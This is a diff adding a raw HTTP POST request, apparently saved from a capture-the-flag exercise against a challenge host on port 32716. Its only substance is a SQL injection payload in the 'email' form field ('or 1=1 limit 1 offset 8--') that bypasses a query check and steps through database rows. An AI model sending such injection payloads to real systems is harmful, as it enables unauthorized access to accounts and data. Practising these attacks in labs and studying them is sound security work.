@@ -1,0 +1,18 @@
+POST / HTTP/1.1
+Host: gc1.eng.run:32716
+Content-Length: 177
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryBaDgxizkPR5loY7R
+Accept: */*
+Origin: http://gc1.eng.run:32716
+Referer: http://gc1.eng.run:32716/
+Accept-Encoding: gzip, deflate
+Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
+Connection: close
+
+------WebKitFormBoundaryBaDgxizkPR5loY7R
+Content-Disposition: form-data; name="email"
+
+test@test.com' or 1=1 limit 1 offset 8-- 
+------WebKitFormBoundaryBaDgxizkPR5loY7R--
+
